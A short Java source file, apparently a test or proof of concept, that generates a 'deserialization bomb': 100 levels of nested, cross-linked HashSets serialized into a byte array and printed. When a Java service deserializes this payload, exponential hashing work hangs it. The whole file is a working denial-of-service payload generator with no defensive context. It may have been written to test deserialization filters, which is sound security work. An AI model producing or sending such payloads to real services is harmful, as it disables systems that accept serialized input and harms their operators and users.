package test;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public class DeserializationBomb {

    private static byte[] bomb() throws IOException {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo");
            s1.add(t1); s1.add(t2);
            s2.add(t1); s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }

    public static void main(String[] args) throws IOException {
        byte[] bomb = bomb();
        System.out.println(Arrays.toString(bomb));
        System.out.println(bomb.length);
    }

    /**
     * 序列化对象
     *
     * @param obj 对象
     * @return 序列化后的字节数组
     * @throws IOException
     */
    public static byte[] serialize(Object obj) throws IOException {
        if (null == obj) {
            return null;
        }

        try (
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        ) {

            out.writeObject(obj);
            return byteArrayOutputStream.toByteArray();
        }
    }
}
